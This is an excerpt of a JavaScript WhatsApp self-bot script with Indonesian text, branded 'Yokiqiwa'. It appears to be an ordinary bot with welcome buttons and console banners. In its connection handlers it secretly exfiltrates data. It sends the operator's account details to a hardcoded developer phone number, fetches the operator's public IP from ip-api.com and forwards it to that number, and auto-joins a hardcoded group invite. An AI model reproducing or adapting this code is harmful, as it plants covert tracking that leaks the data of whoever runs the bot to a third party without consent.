...
const gcrevoke = ["994403013485-1621430788@g.us"]
prefix = '#'
shp = '⬡'
owner = "994403013485@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["Yokiqiwa", "Chrome", "3.0"];
  ...
  client.on("qr", () => {
    console.log(
      ...
      color("]", "white"),
      color(" Scan bang"),
      client.sendMessage(`994403013485@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Berhasil Terhubung!_`, MessageType.extendedText)
  ...
  client.on("open", () => {
    success("2", "Connect Sukses > Follow @rxklz");
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝗬𝗼𝗸𝗶𝗾𝗶𝘄𝗮 シ︎', 'yellow'))
    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/994403013485'))
    console.log(color('[SELF-BOT]'), color('𝗦𝗲𝗹𝗳𝗯𝗼𝘁 𝗘𝗺𝗶𝗹𝗹𝗶𝗮 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 teks = `https://chat.whatsapp.com/EnT2jSrOizyI6gMGIs35qv`
 client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Family Meme🏳️‍🌈⃠ group', 'cyan'))
 client.sendMessage(`994403013485@s.whatsapp.net`, `*Hai Owner Yokiqiwa, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Emillia Bot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./YokiGans.jpg'),sourceUrl:"https://wa.me/994403013485?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("994403013485@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Zexy Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./YokiGans.jpg'),sourceUrl:"https://wa.me/994403013485?text=Assalamualaikum"}}})
...
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '994403013485-1604595598@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'Yokiqiwaシ︎⁩',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Yokiqiwa;;;\nFN:resku\nitem1.TEL;waid=994403013485:+62 813-1405-0985\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
...
if (anu.action == 'add' && !mem.includes(client.user.jid)) {
			 ...
			 const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
                ...
                welcomeBut = [{buttonId:`${prefix}getdeskgc`,buttonText:{displayText:'WELCOME'},type:1}]
            ...
            if (anu.action == 'remove' && !mem.includes(client.user.jid)) {
                ...
                goodbyeBut = [{buttonId:`${prefix}h`,buttonText:{displayText:'SELAMAT TINGGAL BEBAN!'}]
